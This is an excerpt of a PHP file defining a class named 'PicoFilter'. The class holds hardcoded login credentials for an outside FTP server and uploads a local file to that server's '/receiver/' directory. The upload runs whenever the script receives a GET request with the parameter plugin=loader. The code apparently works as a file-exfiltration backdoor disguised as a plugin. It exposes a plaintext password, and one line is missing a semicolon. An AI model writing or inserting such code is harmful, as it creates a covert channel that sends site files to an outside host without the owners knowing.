...
class PicoFilter
{
    private $ftpServer = 'ftp.baracoda.xyz'  
    private $ftpUsername = 'picoadmin'; 
    private $ftpPassword = 'charlin_wolf13$'; 
    private $ftpDirectory = '/receiver/'; 

    public function getContent()
    {
        return [
            "message" => "Files are being uploaded to the FTP server.",
            "status" => 200,
        ];
    }

    public function uploadFiles($filePath)
    {
        // Establish FTP connection
        $ftpConnection = ftp_connect($this->ftpServer);

        // Login to FTP server
        if (!$ftpConnection || !ftp_login($ftpConnection, $this->ftpUsername, $this->ftpPassword)) {
            return [
                "message" => "FTP connection or login failed.",
                "status" => 500,
            ];
        }

        // Upload the file to the FTP server
        $uploadStatus = ftp_put($ftpConnection, $this->ftpDirectory . basename($filePath), $filePath, FTP_BINARY);
...
// Automatically handle the class call if the file is accessed directly
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    // Check if the 'plugin' parameter is set and matches 'loader'
    if (isset($_GET['plugin']) && $_GET['plugin'] === 'loader') {
        // File path to be uploaded (can be passed as a parameter or hardcoded)
        $filePath = 'path_to_your_file.txt'; // Replace with the actual file path you want to upload

        // Instantiate the class and get content
        $myClass = new PicoFilter();
        
        // Upload file to FTP
        $uploadResponse = $myClass->uploadFiles($filePath);

        // Return the upload response as JSON
        header('Content-Type: application/json');
        echo json_encode($uploadResponse);
    } else {
        // Skip processing and return a generic response or nothing
        header('Content-Type: application/json');
        echo json_encode([
            "message" => "Invalid or missing plugin parameter.",
            "status" => 400,
        ]);
    }
    exit;
